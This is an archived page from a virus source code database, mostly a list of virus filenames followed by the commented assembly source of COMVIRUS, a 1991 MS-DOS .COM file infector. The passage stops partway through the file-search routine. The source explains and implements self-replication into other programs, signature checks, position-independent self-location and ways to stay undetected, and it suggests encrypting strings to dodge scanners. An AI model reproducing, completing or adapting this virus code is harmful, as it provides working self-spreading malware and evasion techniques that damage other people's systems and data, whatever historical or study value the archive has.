<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: cv4_asm</title>
<meta name="KEYWORDS" content="cv4.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for cv4.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="c0t_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c0t_asm.php">c0t_asm</a><br>
<a href="c_1701_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c_1701_asm.php">c_1701_asm</a><br>
<a href="c_1704_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c_1704_1_asm.php">c_1704_1_asm</a><br>
<a href="c_1704_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c_1704_2_asm.php">c_1704_2_asm</a><br>
<a href="c-1704_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c-1704_asm.php">c-1704_asm</a><br>
<a href="c1704_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c1704_asm.php">c1704_asm</a><br>
<a href="c-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c-3_asm.php">c-3_asm</a><br>
<a href="c-3-mut_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c-3-mut_asm.php">c-3-mut_asm</a><br>
<a href="cacodmon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cacodmon_asm.php">cacodmon_asm</a><br>
<a href="c_a_d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c_a_d_asm.php">c_a_d_asm</a><br>
<a href="caffein_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/caffein_asm.php">caffein_asm</a><br>
<a href="canadian_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/canadian_asm.php">canadian_asm</a><br>
<a href="canbis2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/canbis2__asm.php">canbis2__asm</a><br>
<a href="canbis4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/canbis4_asm.php">canbis4_asm</a><br>
<a href="cancer___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cancer___asm.php">cancer___asm</a><br>
<a href="cancer__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cancer__asm.php">cancer__asm</a><br>
<a href="cancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cancer_asm.php">cancer_asm</a><br>
<a href="cannab1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab1_asm.php">cannab1_asm</a><br>
<a href="cannab2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab2__asm.php">cannab2__asm</a><br>
<a href="cannab2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab2_asm.php">cannab2_asm</a><br>
<a href="cannab3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab3__asm.php">cannab3__asm</a><br>
<a href="cannab3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab3_asm.php">cannab3_asm</a><br>
<a href="cannab_4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab_4_asm.php">cannab_4_asm</a><br>
<a href="cannab4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab4__asm.php">cannab4__asm</a><br>
<a href="cannab4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab4_asm.php">cannab4_asm</a><br>
<a href="carbunc__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/carbunc__asm.php">carbunc__asm</a><br>
<a href="carbunc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/carbunc_asm.php">carbunc_asm</a><br>
<a href="caroevil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/caroevil_asm.php">caroevil_asm</a><br>
<a href="carpdiem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/carpdiem_asm.php">carpdiem_asm</a><br>
<a href="cascade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cascade_asm.php">cascade_asm</a><br>
<a href="casino_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/casino_asm.php">casino_asm</a><br>
<a href="catch22_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/catch22_asm.php">catch22_asm</a><br>
<a href="catfod_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/catfod_pas.php">catfod_pas</a><br>
<a href="catphis__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/catphis__asm.php">catphis__asm</a><br>
<a href="catphish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/catphish_asm.php">catphish_asm</a><br>
<a href="caza_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/caza_asm.php">caza_asm</a><br>
<a href="cclust2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cclust2_asm.php">cclust2_asm</a><br>
<a href="cdeath1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdeath1_asm.php">cdeath1_asm</a><br>
<a href="cdeath3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdeath3_asm.php">cdeath3_asm</a><br>
<a href="cdeath4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdeath4_asm.php">cdeath4_asm</a><br>
<a href="cdeath5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdeath5_asm.php">cdeath5_asm</a><br>
<a href="cdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdeath_asm.php">cdeath_asm</a><br>
<a href="cdset4___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset4___asm.php">cdset4___asm</a><br>
<a href="cdset4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset4__asm.php">cdset4__asm</a><br>
<a href="cdset4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset4_asm.php">cdset4_asm</a><br>
<a href="cdset5___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset5___asm.php">cdset5___asm</a><br>
<a href="cdset5__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset5__asm.php">cdset5__asm</a><br>
<a href="cdset5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset5_asm.php">cdset5_asm</a><br>
<a href="cdset6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset6_asm.php">cdset6_asm</a><br>
<a href="cdset_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset_asm.php">cdset_asm</a><br>
<a href="cemetary_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cemetary_asm.php">cemetary_asm</a><br>
<a href="chad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/chad_asm.php">chad_asm</a><br>
<a href="change_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/change_asm.php">change_asm</a><br>
<a href="cheeba_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cheeba_asm.php">cheeba_asm</a><br>
<a href="cheesy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cheesy_asm.php">cheesy_asm</a><br>
<a href="cheezy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cheezy_asm.php">cheezy_asm</a><br>
<a href="chicago_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/chicago_asm.php">chicago_asm</a><br>
<a href="choinka_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/choinka_asm.php">choinka_asm</a><br>
<a href="cia2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cia2_asm.php">cia2_asm</a><br>
<a href="cia___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cia___asm.php">cia___asm</a><br>
<a href="cia__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cia__asm.php">cia__asm</a><br>
<a href="cia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cia_asm.php">cia_asm</a><br>
<a href="ci_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/ci_asm.php">ci_asm</a><br>
<a href="civil210_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil210_asm.php">civil210_asm</a><br>
<a href="civil211_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil211_asm.php">civil211_asm</a><br>
<a href="civil_2b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil_2b_asm.php">civil_2b_asm</a><br>
<a href="civil310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil310_asm.php">civil310_asm</a><br>
<a href="civil411_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil411_asm.php">civil411_asm</a><br>
<a href="civil412_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil412_asm.php">civil412_asm</a><br>
<a href="civil510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil510_asm.php">civil510_asm</a><br>
<a href="civil5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil5_asm.php">civil5_asm</a><br>
<a href="civil_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil_ii_asm.php">civil_ii_asm</a><br>
<a href="civilsrv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civilsrv_asm.php">civilsrv_asm</a><br>
<a href="clonewa__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/clonewa__asm.php">clonewa__asm</a><br>
<a href="clonewar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/clonewar_asm.php">clonewar_asm</a><br>
<a href="clonwar2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/clonwar2_asm.php">clonwar2_asm</a><br>
<a href="clust__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/clust__asm.php">clust__asm</a><br>
<a href="clust_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/clust_asm.php">clust_asm</a><br>
<a href="cluster_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cluster_asm.php">cluster_asm</a><br>
<a href="cocaine_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cocaine_asm.php">cocaine_asm</a><br>
<a href="codezer__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/codezer__asm.php">codezer__asm</a><br>
<a href="codezero_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/codezero_asm.php">codezero_asm</a><br>
<a href="coffshp1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/coffshp1_asm.php">coffshp1_asm</a><br>
<a href="coffshp3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/coffshp3_asm.php">coffshp3_asm</a><br>
<a href="coke_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/coke_asm.php">coke_asm</a><br>
<a href="com_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/com_asm.php">com_asm</a><br>
<a href="comdex7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comdex7_asm.php">comdex7_asm</a><br>
<a href="comment1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comment1_asm.php">comment1_asm</a><br>
<a href="comment2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comment2_asm.php">comment2_asm</a><br>
<a href="compa100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compa100_asm.php">compa100_asm</a><br>
<a href="compan88_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compan88_asm.php">compan88_asm</a><br>
<a href="compan92_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compan92_asm.php">compan92_asm</a><br>
<a href="compan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compan_asm.php">compan_asm</a><br>
<a href="compiler_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compiler_asm.php">compiler_asm</a><br>
<a href="compres_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compres_asm.php">compres_asm</a><br>
<a href="comshel2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comshel2_asm.php">comshel2_asm</a><br>
<a href="comshell_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comshell_asm.php">comshell_asm</a><br>
<a href="comvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comvirus_asm.php">comvirus_asm</a><br>
<a href="conj-270_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/conj-270_asm.php">conj-270_asm</a><br>
<a href="conj-300_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/conj-300_asm.php">conj-300_asm</a><br>
<a href="conj-ajx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/conj-ajx_asm.php">conj-ajx_asm</a><br>
<a href="conj-ala_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/conj-ala_asm.php">conj-ala_asm</a><br>
<a href="conjurer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/conjurer_asm.php">conjurer_asm</a><br>
<a href="cookie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cookie_asm.php">cookie_asm</a><br>
<a href="cookie_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cookie_c.php">cookie_c</a><br>
<a href="copcom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/copcom_asm.php">copcom_asm</a><br>
<a href="copyr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/copyr_asm.php">copyr_asm</a><br>
<a href="cpi2_5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cpi2_5_asm.php">cpi2_5_asm</a><br>
<a href="cpxk_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cpxk_asm.php">cpxk_asm</a><br>
<a href="cpyr1193_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cpyr1193_asm.php">cpyr1193_asm</a><br>
<a href="crazy_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crazy_c.php">crazy_c</a><br>
<a href="crdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crdeath_asm.php">crdeath_asm</a><br>
<a href="creepdth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/creepdth_asm.php">creepdth_asm</a><br>
<a href="creeper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/creeper_asm.php">creeper_asm</a><br>
<a href="creeperb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/creeperb_asm.php">creeperb_asm</a><br>
<a href="crepdeth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crepdeth_asm.php">crepdeth_asm</a><br>
<a href="crf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crf_asm.php">crf_asm</a><br>
<a href="crf_mdm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crf_mdm_asm.php">crf_mdm_asm</a><br>
<a href="crf-mdm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crf-mdm_asm.php">crf-mdm_asm</a><br>
<a href="crumble__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crumble__asm.php">crumble__asm</a><br>
<a href="crumble_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crumble_asm.php">crumble_asm</a><br>
<a href="csl_beta_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/csl_beta_asm.php">csl_beta_asm</a><br>
<a href="curse_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/curse_asm.php">curse_asm</a><br>
<a href="cursev12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cursev12_asm.php">cursev12_asm</a><br>
<a href="cv4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cv4_asm.php">cv4_asm</a><br>
<a href="cv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cv_asm.php">cv_asm</a><br>
<a href="cvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cvirus_asm.php">cvirus_asm</a><br>
<a href="cvirus_v19_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cvirus_v19_c.php">cvirus_v19_c</a><br>
<a href="cvirus_v20_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cvirus_v20_c.php">cvirus_v20_c</a><br>
<a href="cvirus_v21_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cvirus_v21_c.php">cvirus_v21_c</a><br>
<a href="cvirus_v30_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cvirus_v30_c.php">cvirus_v30_c</a><br>
<a href="cw_navig_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cw_navig_asm.php">cw_navig_asm</a><br>
<a href="cw-navig_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cw-navig_asm.php">cw-navig_asm</a><br>
<a href="cybertch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybertch_asm.php">cybertch_asm</a><br>
<a href="cybr1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybr1307_asm.php">cybr1307_asm</a><br>
<a href="cybrcide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybrcide_asm.php">cybrcide_asm</a><br>
<a href="cybrtcha_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybrtcha_asm.php">cybrtcha_asm</a><br>
<a href="cybrtchb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybrtchb_asm.php">cybrtchb_asm</a><br>
<a href="cybtch_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybtch_b_asm.php">cybtch_b_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

title COMVIRUS
subttl By Drew Eckhardt
subttl Latest revision: 4-28-1991

;The author of this virus intends it to be used for educational
;purposes only, and assumes no responsibilities for its release,
;dammages resulting from its use, including but not limited to
;equipment dammage or data loss.

;By assembling or examining this program, The user agrees to accept all
;responsibility for this programs use, or any portions of the code
;or concepts contained within.  The user also agrees to not publicly release
;this virus, and to exercise necessary precautions to prevent its escape.
;The user accepts all responsibility arising from his actions.

;Don't come crying to me if your hard disk gets infected,
;as THERE IS NO ANTIDOTE.  HAHAHAH.


;Revision history:
;4-13: initial bug-free release, size=424 bytes with carrier

;4-15: added no date change support, size=438 bytes with carrier

;4-16: minor documentation changes, size=438 bytes with carrier,
;      NO CODE CHANGE from 4-15 revision

;4-21: fixed missing hex h suffixs, made MASM friendly,
;      fixed incorrect assume statement (assume statements are ignored
;      by A86) enabled hard/floppy infection based on floppy_only status
;      size=438 bytes IF floppy_only, 424 bytes if not, with carrier.
;      minimum virus length = 419 bytes
	
;4-23: added control over how many programs are infected per run,
;      switched method of infection, from copying to DTA then writing
;      to disk to straight write to disk from memory.
;      size=412 bytes IF floppy_only, 398 bytes if not, with carrier.
;      minimum virus length = 393 bytes
	
;4-28: used set DTA instead of default DTA/copy command line
;      buffer, which had been used based on incorrect assumption
;      eliminated calls to get time/date, get attribs
;      by using information from find first/find next functions 4eh/4fh
;      made warning optional for reduced space if desired.  Also
;      changed mov reg16, bp add reg16, constant to shorter LEA instruction.
;      size=354 bytes IF floppy_only, warning on W/carrier
;           340 bytes IF w/warning & carrier program
;           286 bytes w/o warning, in program
;       minimum virus length = 281 bytes for virus itself

;4-28pm:  instead of near CALL-pop sequences everywhere, switched to
;         a single CALL near ptr Reference_Point, putting the result into
;         si now that (until the end) string mode addressing is not used.
;         Changed places where a register (used as an index)
;         was being loaded THEN added to a single LEA isntruction
;       size = 340 bytes if floppy_only, warning on w/carrier
;       size = 326 bytes if w/warning & carrier
;	size = 272 w/o warning
;	minimum virus length = 267 bytes for the virus itself

;4-28pm2: Eliminated unecessary flush buffers call.
;       size = 336 bytes if floppy_only w/carrier
;       size = 322 bytes w/warning & carrier
;	size = 268 w/o warning
;	minimum virus length = 263 bytes for virus itself

;4-30:	restored 5 bytes of original code at CS:0100
;	before infecting other programs, allowing the
;	original code field to be modified so one disk write could be
;	used instead of two
;	minor documentation revisions - corrected incorrect
;	opcodes in documentation
;	size = 326 bytes if floppy_only w/carrier
;	size = 312 bytes w/warning & carrier program
;	size = 258 bytes w/carrier program
;	Minimum virus length = 253 bytes for the virus itself
	
;NOTE:  The program is currently "set up" for A86 assembly with all
;conditional assembly symbols.  #IF and #ENDIF should be replaced with
;MASM IFDEF and ENDIF directives for propper operation.
;Also, instead of using EQUates to define control symbols, the /D
;option or DEFINE could be used.....


;COMVIRUS.ASM must be assembled into a .COM file inorder to function
;properly.  For convieniece, I recommend an assembler like A86 that will
;assemble to a .COM file without having to go through LINK and EXE2BIN

;As is, it will infect .COM files located on the current disk.
;ONLY if it is a floppy disk, ONLY in the root directory.

;This is a .COM infector virus, which, does nothing other than print a
;warning message, and spread to all files on the default disk IFF it is
;a floppy disk, in the root directory.

;Theory:
;This is a non - overwriting virus.  I took special precautions to preserve
;all functionality of the original program, including command line, parsed FCB,
;and segment register preservation.  This makes the virus harder to detect.

;The .COM file is a memory image - with no relocation table.  Thus, it
;is an easy target for a virus such as this.

;Infected file format
;jmp near ptr xxxx
;cli cli                ;ID bytes
;ORIGINAL program code, sans 5 bytes
;5 bytes ORIGINAL program code
;VIRUS

;This format makes infection VERY simple.  We merely check for our signature
;(in this case cli cli (fa fa) - instructions that no programmer in his
;right mind would use - loading the original five bytes in the process.
;These original bytes are written to the end of the program, then
;A jump to where the virus is.

;While infection is easy, this method presents some coding problems, as the
;virus does not know where in memory it is.  Therefor, When we want to access
;data, we FIND OUT where we are, by performing a near call which PUSHES ip to the
;stack which is then popped.  Addresses are then calculated relative to this
;via LEA

;To run the program as normal, command line is restored, registers restored,
;And original code copied onto the first five bytes of the program.


;Program control symbols defined here
floppy_only equ 1
infect_per_run equ 1            ;number of programs infected per run
warn_user equ 1

_TEXT segment byte 'CODE'
        assume cs:_TEXT,ds:_TEXT,es:_TEXT,ss:_TEXT
        org 100h

Start:  jmp     infect;

;This is our signature
        cli
        cli

;Original code is the data field where we store the original program code
;which will replace our signature and jmp to infect

Original_Code:  int     20h             ;five bytes that simply terminate
                nop                     ;the program
                nop
                nop



;Data for the virus.  In a destructive virus, you would want to encrypt
;any strings using a simple one's complement (not) operation so as to
;thwart detection via text search utilities.  Since we want detection to
;be easy, this un-encrypted form is fine.


Start_Virus:
#IF warn_user
        Warning db "This file infected with COMVIRUS 1.0",10,13,'$'
#ENDIF

;VirusMask is simply an ASCIIZ terminated string of the files we wish to
;infect.

        VirusMask db '*.COM', 0
Infect:
        push    ax                      ;on entry to a .COM program,                            STACK:
                                        ;MS-DOS puts drive identifiers                          ax (drive id for FCB's) <-- sp
                                        ;for the two FCB's in here.  Save
                                        ;'em

        ;I use special trickery to find location of data.  Since
        ;NEAR calls/jmps are RELATIVE, call near ptr find_warn is
	;translated to e8 0000 - which will simply place the location
	;of Reference onto the stack.  Our data can be found relative to
	;this point.

        call near ptr Reference         ;All data is reference realative to
                                        ;Reference


Reference: pop  bx                      ;which is placed into bx for LEA
					;instructions
					;bx now contains the REAL address of
					;Reference
					;si points to real address of original
					;code field
	lea     si, [bx-(offset Reference - offset Original_Code)]
	mov     di, 0100h		;original code is at 100h
	mov     cx, 5			;5 bytes
	cld				;from start of buffer
	rep     movsb			;do it

	mov	si, bx			;since BX is used in handle
					;based DOS calls, for the remainder
					;of the virus, si will contain the
					;actual address of reference

#IF warn_user

        ;Always calculate the address of data relative to known Reference
        ;Point
        lea     dx, [si-(offset Reference - offset Warning)]
        mov     ah,9h                   ;DO dos call, DS:DX pointing
        int     21h                     ;to $ terminated string

        ;We want to make sure that the user gets the message

WaitForKey:
        mov     ah, 0bh                 ;we will wait for a keypress
        int     21h                     ;signifying the user has
        or      al, al                  ;seen the message.
        jz      WaitForKey

#ENDIF

#IF FLOPPY_ONLY

        ;Since this is a simple demonstration virus, we will only infect
        ;.COM files on the default drive IFF it is a floppy disk....
        ;So, we will get information about the disk drive.


        push    ds                      ;ds:bx returns a byte to
                                        ;media descriptor

        mov     ah, 1bh                 ;get disk information                                   STACK
        int     21h                     ;DOIT                                                   ax (drive ID's)
        cmp     byte ptr ds:[bx], 0f8h  ;see if its a hard disk                                 ds <--sp

        pop     ds                      ;restore ds                                             STACK
        jne     Floppy                  ;if it was hard....                                     ax <--sp
        jmp     near ptr done           ;we're nice guys and are done

Floppy: ;Since it was floppy, we can go on with the infection!
#ENDIF
        ;The default DTA, as is will give us problems.  The designers of
        ;MickeySoft DOS decided to put default DTA at ofset 128 in
        ;the PSP.  PROBLEM:  This is also where the user's precious command
        ;line is, and we MUST remain undectected.  SO.... we allocate a
        ;DTA buffer on the stack.  43 bytes are needed, 44 will do.

        sub     sp,  44                 ;allocate space for findfirst/findnext DTA
        mov     bp, sp                  ;set up bp as a reference to this area

        ;Set the DTA
        mov     dx, bp                  ;point DS:DX to our area
        mov     ah, 1ah                 ;set DTA
        int     21h

        ;Set up pointers to data in DTA
        dta     equ word ptr [bp]
        file_name equ word ptr [bp+1eh]
        attributes equ byte ptr [bp+15h]
        time_stamp equ word ptr [bp+16h]
        date_stamp equ word ptr [bp+18h]
        file_size equ dword ptr [bp+1ah]

        ;We dynamically allocate a variable to store the number of programs                     STACK
        ;The virus has infected.                                                                FCB drives
        ;                                                                               bp-->   44 byte DTA
        infected_count equ byte ptr[bp-2];                                                      Infected_Count
        xor     ax, ax                  ;zero variable,                                 sp-->   buffer (6 bytes)
        push    ax                      ;allocate it on the stack
        sub     sp, 6                   ;allocate small buffer

        ;Now, we begin looking for files to infect.
        lea     dx, [si - (offset Reference - offset VirusMask)]
